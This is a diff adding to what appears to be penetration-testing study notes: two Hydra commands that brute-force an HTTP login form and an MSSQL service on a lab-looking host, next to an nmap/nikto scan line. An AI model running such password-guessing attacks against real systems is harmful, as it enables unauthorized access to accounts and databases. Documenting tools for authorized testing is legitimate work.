@@ -51,6 +51,15 @@
 # nmap -p80 192.168.0.0/24 -oG - | nikto -h -   // scan multiple hosts
 ```
 
+*Hydra* 爆破常见的服务
+
+```bash
+hydra -L user.txt  -P pass.txt 10.11.1.31 http-post-form "/login-off.asp:txtLoginID=^USER^&txtPassword=^PASS^&cmdSubmit=Login:F=ACCESS DENIED" -V
+
+
+hydra -l usernmae  -P pass.txt 10.11.1.31 mssql -V # cracked 1433 ports windows
+```
+
 
 
 ### LFI2RCE
